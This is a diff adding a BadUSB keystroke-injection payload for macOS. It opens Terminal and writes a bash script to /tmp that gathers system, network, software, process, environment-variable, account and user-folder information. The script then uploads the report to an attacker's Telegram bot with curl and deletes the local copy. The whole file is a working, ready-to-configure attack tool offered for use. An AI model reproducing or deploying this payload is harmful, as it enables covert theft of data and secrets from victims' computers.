@@ -1,0 +1,137 @@
+REM Title: macOS System Reconnaissance to Telegram
+REM Author: BadUSB Library
+REM Description: Comprehensive system reconnaissance and sends to Telegram
+REM Target: macOS 10.15+
+REM Category: Discovery
+REM Type: Configuration Needed
+
+REM *SETUP*
+REM Replace TELEGRAM_BOT_TOKEN with your Telegram Bot Token
+REM Replace TELEGRAM_CHAT_ID with your Telegram Chat ID
+
+REM Open Terminal
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+DELAY 2000
+
+REM Create system reconnaissance script
+STRING cat > /tmp/system_recon.sh << 'EOF'
+#!/bin/bash
+
+# Telegram configuration
+BOT_TOKEN="TELEGRAM_BOT_TOKEN"
+CHAT_ID="TELEGRAM_CHAT_ID"
+
+# Function to send message to Telegram
+send_telegram() {
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d chat_id="${CHAT_ID}" \
+        -d text="$1"
+}
+
+# Function to send file to Telegram
+send_file_telegram() {
+    local file_path="$1"
+    local caption="$2"
+    
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
+        -F chat_id="${CHAT_ID}" \
+        -F document=@"${file_path}" \
+        -F caption="${caption}"
+}
+
+# Create reconnaissance file
+RECON_FILE="/tmp/macos_recon_$(date +%Y%m%d_%H%M%S).txt"
+
+echo "=== macOS System Reconnaissance ===" > $RECON_FILE
+echo "Date: $(date)" >> $RECON_FILE
+echo "User: $(whoami)" >> $RECON_FILE
+echo "Hostname: $(hostname)" >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# System information
+echo "=== System Information ===" >> $RECON_FILE
+system_profiler SPSoftwareDataType >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Hardware information
+echo "=== Hardware Information ===" >> $RECON_FILE
+system_profiler SPHardwareDataType >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Network information
+echo "=== Network Information ===" >> $RECON_FILE
+ifconfig >> $RECON_FILE
+netstat -rn >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Installed software
+echo "=== Installed Software ===" >> $RECON_FILE
+system_profiler SPApplicationsDataType >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Running processes
+echo "=== Running Processes ===" >> $RECON_FILE
+ps aux >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Environment variables
+echo "=== Environment Variables ===" >> $RECON_FILE
+env >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# User accounts
+echo "=== User Accounts ===" >> $RECON_FILE
+dscl . list /Users >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Groups
+echo "=== Groups ===" >> $RECON_FILE
+dscl . list /Groups >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Services
+echo "=== Services ===" >> $RECON_FILE
+launchctl list >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# File system
+echo "=== File System ===" >> $RECON_FILE
+df -h >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Recent files
+echo "=== Recent Files ===" >> $RECON_FILE
+ls -la ~/Desktop/ >> $RECON_FILE
+ls -la ~/Documents/ >> $RECON_FILE
+ls -la ~/Downloads/ >> $RECON_FILE
+echo "" >> $RECON_FILE
+
+# Browser history (if accessible)
+echo "=== Browser Information ===" >> $RECON_FILE
+if [ -d ~/Library/Application\ Support/Google/Chrome/Default ]; then
+    echo "Chrome installed" >> $RECON_FILE
+fi
+if [ -d ~/Library/Safari ]; then
+    echo "Safari installed" >> $RECON_FILE
+fi
+echo "" >> $RECON_FILE
+
+# Send to Telegram
+send_telegram "🔍 macOS System Reconnaissance Completed"
+send_file_telegram "$RECON_FILE" "Complete System Reconnaissance Report"
+
+# Cleanup
+rm -f $RECON_FILE
+
+EOF
+ENTER
+
+REM Make executable and run
+STRING chmod +x /tmp/system_recon.sh
+ENTER
+STRING /tmp/system_recon.sh
+ENTER
